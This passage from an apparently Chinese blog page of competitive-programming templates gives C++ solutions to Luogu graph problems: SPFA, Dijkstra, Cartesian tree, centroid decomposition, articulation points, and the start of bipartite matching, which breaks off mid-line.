&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>, w = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(u, v, w);</span><br><span class="line">        G[v].<span class="built_in">push_back</span>((EDGE)&#123;u, w&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        G[n + <span class="number">1</span>].<span class="built_in">push_back</span>((EDGE)&#123;i, <span class="number">0</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">SPFA</span>()) <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="built_in">print</span>(dis[i]), <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="单源最短路径（Dijkstra）"><a href="#单源最短路径（Dijkstra）" class="headerlink" title="单源最短路径（Dijkstra）"></a>单源最短路径（Dijkstra）</h1><p><strong>洛谷P4779</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">9</span>, M = <span class="number">2e5</span> + <span class="number">9</span>, INF = <span class="number">2e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> head[N], nex[M], to[M], w[M], cnt;</span><br><span class="line"><span class="type">int</span> n, m, s;</span><br><span class="line"><span class="type">int</span> dis[N], vis[N];</span><br><span class="line">priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;, greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; &gt; H;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    nex[++cnt] = head[u];</span><br><span class="line">    to[cnt] = v;</span><br><span class="line">    w[cnt] = val;</span><br><span class="line">    head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m, s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>, w = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(u, v, w);</span><br><span class="line">        <span class="built_in">add_edge</span>(u, v, w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        dis[i] = INF;</span><br><span class="line">    &#125;</span><br><span class="line">    dis[s] = <span class="number">0</span>;</span><br><span class="line">    H.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="number">0</span>, s));</span><br><span class="line">    <span class="keyword">while</span> (!H.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> now = H.<span class="built_in">top</span>().second;</span><br><span class="line">        H.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (vis[now]) <span class="keyword">continue</span>;</span><br><span class="line">        vis[now] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = head[now]; i; i = nex[i]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[now] + w[i] &lt; dis[to[i]]) &#123;</span><br><span class="line">                dis[to[i]] = dis[now] + w[i];</span><br><span class="line">                H.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(dis[to[i]], to[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>, dis[i], <span class="string">&quot; \n&quot;</span>[i == n]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="笛卡尔树"><a href="#笛卡尔树" class="headerlink" title="笛卡尔树"></a>笛卡尔树</h1><p><strong>洛谷P5854</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e7</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n, lans, rans;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> stk[N], val[N], lson[N], rson[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, top = <span class="number">0</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(val[i]);</span><br><span class="line">        <span class="type">int</span> pos = top;</span><br><span class="line">        <span class="keyword">while</span> (pos &amp;&amp; val[stk[pos]] &gt; val[i]) --pos;</span><br><span class="line">        <span class="keyword">if</span> (pos) rson[stk[pos]] = i;</span><br><span class="line">        <span class="keyword">if</span> (pos &lt; top) lson[i] = stk[pos + <span class="number">1</span>];</span><br><span class="line">        stk[top = ++pos] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) lans ^= i * (lson[i] + <span class="number">1</span>), rans ^= i * (rson[i] + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">print</span>(lans), <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>), <span class="built_in">print</span>(rans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="点分治"><a href="#点分治" class="headerlink" title="点分治"></a>点分治</h1><p><strong>洛谷P3806</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e4</span> + <span class="number">9</span>, M = <span class="number">109</span>, INF = <span class="number">1e7</span> + <span class="number">9</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EDGE</span>&#123;<span class="type">int</span> to, val;&#125;;</span><br><span class="line">vector&lt;EDGE&gt; G[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> root, reccnt, nowsize, ms[N], vis[N], dis[N], size[N], rec[N], book[INF], res[M], que[M], clr[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getroot</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> f)</span> </span>&#123;</span><br><span class="line">    size[x] = <span class="number">1</span>, ms[x] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> w : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (w.to == f || vis[w.to]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">getroot</span>(w.to, x);</span><br><span class="line">        size[x] += size[w.to];</span><br><span class="line">        ms[x] = <span class="built_in">max</span>(ms[x], size[w.to]);</span><br><span class="line">    &#125;</span><br><span class="line">    ms[x] = <span class="built_in">max</span>(nowsize - size[x], ms[x]);</span><br><span class="line">    <span class="keyword">if</span> (ms[x] &lt; ms[root]) root = x;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getdis</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> f)</span> </span>&#123;</span><br><span class="line">    rec[++reccnt] = dis[x];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> w : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (w.to == f || vis[w.to]) <span class="keyword">continue</span>;</span><br><span class="line">        dis[w.to] = dis[x] + w.val;</span><br><span class="line">        <span class="built_in">getdis</span>(w.to, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> clrcnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> w : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (vis[w.to])<span class="keyword">continue</span>;</span><br><span class="line">        reccnt = <span class="number">0</span>, dis[w.to] = w.val;</span><br><span class="line">        <span class="built_in">getdis</span>(w.to, x);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= reccnt; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (que[j] &gt;= rec[i])res[j] |= book[que[j] - rec[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= reccnt; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (rec[i] &lt;= <span class="number">1e7</span>) clr[++clrcnt] = rec[i], book[rec[i]] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= clrcnt; ++i) book[clr[i]] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">divide</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    vis[x] = <span class="number">1</span>, book[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">solve</span>(x);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> w : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (vis[w.to]) <span class="keyword">continue</span>;</span><br><span class="line">        root = <span class="number">0</span>, ms[<span class="number">0</span>] = INF;</span><br><span class="line">        nowsize = size[w.to];</span><br><span class="line">        <span class="built_in">getroot</span>(w.to, x);</span><br><span class="line">        <span class="built_in">divide</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>, w = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(u, v, w);</span><br><span class="line">        G[u].<span class="built_in">push_back</span>((EDGE)&#123;v, w&#125;);</span><br><span class="line">        G[v].<span class="built_in">push_back</span>((EDGE)&#123;u, w&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(que[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ms[<span class="number">0</span>] = INF, root = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">getroot</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">divide</span>(root);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(res[i] ? <span class="string">&quot;AYE&quot;</span> : <span class="string">&quot;NAY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="点双分量"><a href="#点双分量" class="headerlink" title="点双分量"></a>点双分量</h1><p><strong>洛谷P3388</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e4</span> + <span class="number">9</span>, M = <span class="number">1e5</span> + <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dfn[N], low[N], cut[N], tarcnt, n, m, ans;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> now, <span class="type">int</span> fa)</span> </span>&#123;</span><br><span class="line">    dfn[now] = low[now] = ++tarcnt;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> chd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> val : G[now]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val == fa) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[val]) &#123;</span><br><span class="line">            ++chd;</span><br><span class="line">            <span class="built_in">tarjan</span>(val, now);</span><br><span class="line">            low[now] = <span class="built_in">min</span>(low[now], low[val]);</span><br><span class="line">            <span class="keyword">if</span> (low[val] &gt;= dfn[now]) cut[now] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> low[now] = <span class="built_in">min</span>(low[now], dfn[val]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (chd == <span class="number">1</span> &amp;&amp; fa == <span class="number">0</span>) cut[now] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(u, v);</span><br><span class="line">        G[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">        G[v].<span class="built_in">push_back</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[i]) <span class="built_in">tarjan</span>(i, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (cut[i]) ++ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(ans), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cut[i]) <span class="built_in">print</span>(i), <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二分图最大匹配"><a href="#二分图最大匹配" class="headerlink" title="二分图最大匹配"></a>二分图最大匹配</h1><p><strong>洛谷P3386</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">long</span> <span class="type">long</span> INF = <span class="number">7435234564764323</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1009</span>, M = <span class="number">5e4</span> + <span 